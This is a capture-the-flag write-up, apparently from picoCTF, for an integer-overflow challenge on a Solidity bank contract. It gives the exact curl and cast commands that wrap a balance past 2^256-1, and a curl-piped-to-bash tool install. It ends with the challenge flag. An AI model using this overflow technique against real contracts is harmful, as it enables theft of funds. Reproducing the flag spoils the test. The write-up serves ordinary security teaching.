# Integer Overflow (IntOverflowBank)

**Link**: https://learn.cylabacademy.org/library/760?page=10

**Difficulty**: medium

## Description

The contract tracks balances using `uint256` math. It should be impossible to get
the flag... A private Ethereum instance gives you a funded account (5 ETH for gas),
your address + private key, and the bank contract address.

## Resources

- **IntOverflowBank.sol**: the deployed contract source

Per-instance values (these change every time you launch the challenge):

    Node (RPC):   http://mysterious-sea.picoctf.net:<port>
    Bank address: 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9
    Your address: 0x....
    Private key:  0x....
    Chain id:     31337

## The vulnerability (from IntOverflowBank.sol)

- `pragma solidity ^0.6.12` and **no SafeMath / no `unchecked` guard** → in that
  compiler, `uint256` arithmetic **silently wraps** instead of reverting.
- `deposit` adds to your balance and then checks a condition that is *only true on
  overflow*:

      function deposit(uint256 amount) external {
          balances[msg.sender] = balances[msg.sender] + amount;
          if (!revealed && balances[msg.sender] < amount) {   // <- overflow detector
              revealed = true;
              emit FlagRevealed(flag);
          }
      }

  `new_balance < amount` can only happen if `old_balance + amount` wrapped past
  `2^256 - 1`. That's the single path that sets `revealed = true`.

So the goal: **make your balance addition overflow.** One deposit from 0 isn't
enough (`0 + amount = amount`, never `< amount`). You need to be at a high balance
first, then push it over the top.

## Tooling note (important for this challenge)

The instance runs an **old Ethereum node** that rejects requests containing both
`input` and `data` fields. Modern `cast` (Foundry ≥ 1.0) always sends both, so
`cast call` / `cast send` fail here with:

    error -32602: duplicate field `data`

Workaround used below:
- **Reads** → raw `curl` JSON-RPC (single `data` field, node accepts it).
- **Sign the tx** → `cast mktx` (offline; curl can't sign).
- **Send the tx** → `curl eth_sendRawTransaction` (takes one signed hex string).

Setup:

    # install Foundry (gives you `cast`)
    curl -L https://foundry.paradigm.xyz | bash && source ~/.bashrc && foundryup

    export RPC=http://mysterious-sea.picoctf.net:<port>
    export BANK=0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9
    export ME=<your address>
    export PK=<your private key>

## How to solve

**1. Check your balance (expect 0).** `cast calldata` builds the call data offline;
curl performs the read:

    curl -s -X POST $RPC -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":"'"$BANK"'","data":"'"$(cast calldata "balances(address)" $ME)"'"},"latest"]}'
    # -> 0x000...000  (balance 0)

**2. Deposit `2^256 - 1` (max uint256), nonce 0.** This sets your balance to the
maximum value:

    RAW=$(cast mktx $BANK "deposit(uint256)" \
      115792089237316195423570985008687907853269984665640564039457584007913129639935 \
      --private-key $PK --chain 31337 --nonce 0 \
      --gas-limit 120000 --gas-price 2000000000 --legacy)

    curl -s -X POST $RPC -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","id":1,"method":"eth_sendRawTransaction","params":["'"$RAW"'"]}'
    # balance now reads 0xffff...ffff

**3. Deposit `1` more, nonce 1 → overflow.** `max + 1` wraps to `0`, and `0 < 1`
trips the reveal:

    RAW=$(cast mktx $BANK "deposit(uint256)" 1 \
      --private-key $PK --chain 31337 --nonce 1 \
      --gas-limit 120000 --gas-price 2000000000 --legacy)

    curl -s -X POST $RPC -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","id":1,"method":"eth_sendRawTransaction","params":["'"$RAW"'"]}'

**4. Read the flag.** `getFlag()` now returns instead of reverting:

    curl -s -X POST $RPC -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":"'"$BANK"'","data":"'"$(cast calldata "getFlag()")"'"},"latest"]}'

The result is an **ABI-encoded string** (32-byte offset + 32-byte length + the
bytes). Decode it:

    cast abi-decode "getFlag()(string)" 0x<result>
    # or, on just the byte run:
    echo 7069636f4354467b...647d | xxd -r -p

## Flag

    picoCTF{Sm4r7_OverFL0ws_ExI5t_09ea331d}
